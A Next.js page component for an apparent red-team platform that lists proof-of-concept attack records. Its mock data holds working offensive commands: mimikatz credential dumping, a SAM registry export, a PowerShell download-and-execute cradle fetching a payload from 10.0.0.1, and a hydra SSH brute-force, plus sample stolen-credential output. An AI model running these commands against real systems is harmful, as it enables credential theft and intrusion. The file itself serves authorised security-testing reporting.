// Copyright 2026 Athena Contributors
//
// Use of this software is governed by the Business Source License 1.1
// included in the LICENSE file.
//
// Change Date: Four years from release date of each version
// Change License: Apache License, Version 2.0
//
// For commercial licensing, contact: [TODO: contact email]

"use client";

import { useEffect, useMemo, useState } from "react";
import { useTranslations } from "next-intl";
import { api } from "@/lib/api";
import { PocSummaryBar } from "@/components/poc/PocSummaryBar";
import { PocRecordCard } from "@/components/poc/PocRecordCard";
import type { PocRecord, PocSummary } from "@/types/poc";

const DEFAULT_OP_ID = "op-0001";

const MOCK_RECORDS: PocRecord[] = [
  {
    id: "poc-001",
    technique_id: "T1003.001",
    technique_name: "OS Credential Dumping: LSASS Memory",
    target_ip: "10.0.1.5",
    commands_executed: ["mimikatz.exe sekurlsa::logonpasswords", "reg save HKLM\\SAM sam.hive"],
    input_params: {},
    output_snippet: "Authentication Id : 0 ; 999\nSession           : UndefinedLogonType\nUser Name         : DC-01$\nDomain            : CORP\nNTLM              : e3b0c44298fc1c149afbf4c8...",
    environment: { os: "Windows Server 2022", engine: "caldera" },
    reproducible: "reproducible",
    timestamp: "2026-03-08T14:32:07Z",
    engine: "caldera",
  },
  {
    id: "poc-002",
    technique_id: "T1059.001",
    technique_name: "Command and Scripting Interpreter: PowerShell",
    target_ip: "10.0.1.10",
    commands_executed: ["powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payload.ps1')\""],
    input_params: { payload_url: "http://10.0.0.1/payload.ps1" },
    output_snippet: "Invoke-Mimikatz completed successfully.\nOutput saved to C:\\temp\\creds.txt",
    environment: { os: "Windows 10 Enterprise", engine: "ssh" },
    reproducible: "partial",
    timestamp: "2026-03-08T15:10:22Z",
    engine: "ssh",
  },
  {
    id: "poc-003",
    technique_id: "T1110.001",
    technique_name: "Brute Force: Password Guessing",
    target_ip: "10.0.1.3",
    commands_executed: ["hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.1.3"],
    input_params: { username: "admin", wordlist: "rockyou.txt" },
    output_snippet: "[22][ssh] host: 10.0.1.3   login: admin   password: P@ssw0rd123",
    environment: { os: "Ubuntu 22.04", engine: "metasploit" },
    reproducible: "reproducible",
    timestamp: "2026-03-08T13:45:00Z",
    engine: "metasploit",
  },
];

function LoadingSkeleton() {
  return (
    <div className="space-y-6 p-6 animate-pulse">
      <div className="h-8 w-64 bg-athena-surface rounded" />
      <div className="grid grid-cols-4 gap-4">
        {[...Array(4)].map((_, i) => (
          <div key={i} className="h-24 bg-athena-surface rounded-athena-md" />
        ))}
      </div>
      <div className="space-y-3">
        {[...Array(3)].map((_, i) => (
          <div key={i} className="h-14 bg-athena-surface rounded-athena-sm" />
        ))}
      </div>
    </div>
  );
}

export default function PocPage() {
  const t = useTranslations("Poc");

  const [records, setRecords] = useState<PocRecord[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    api
      .get<PocRecord[]>(`/operations/${DEFAULT_OP_ID}/poc`)
      .then(setRecords)
      .catch(() => {
        // API not ready yet -- fall back to mock data
        setRecords(MOCK_RECORDS);
      })
      .finally(() => setIsLoading(false));
  }, []);

  const summary: PocSummary = useMemo(() => {
    const uniqueTargets = new Set(records.map((r) => r.target_ip));
    const uniqueTechniques = new Set(records.map((r) => r.technique_id));
    return {
      total: records.length,
      reproducible: records.filter((r) => r.reproducible === "reproducible").length,
      targets: uniqueTargets.size,
      techniques: uniqueTechniques.size,
    };
  }, [records]);

  if (isLoading) return <LoadingSkeleton />;

  return (
    <div className="space-y-6 p-6 athena-grid-bg min-h-full">
      {/* Page Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-mono font-bold text-athena-text">
            {t("title")}
          </h1>
          <p className="text-sm font-mono text-athena-text-secondary mt-1">
            {t("subtitle", { operationId: DEFAULT_OP_ID })}
          </p>
        </div>
        <button className="px-4 py-2 text-xs font-mono font-bold uppercase border border-athena-border rounded-athena-sm bg-athena-surface hover:bg-athena-elevated text-athena-text transition-colors">
          {t("export")}
        </button>
      </div>

      {/* Summary Bar */}
      <PocSummaryBar summary={summary} />

      {/* PoC Records */}
      {records.length === 0 ? (
        <div className="text-center py-12 text-sm font-mono text-athena-text-secondary">
          {t("noRecords")}
        </div>
      ) : (
        <div className="space-y-3">
          {records.map((record) => (
            <PocRecordCard key={record.id} record={record} />
          ))}
        </div>
      )}
    </div>
  );
}
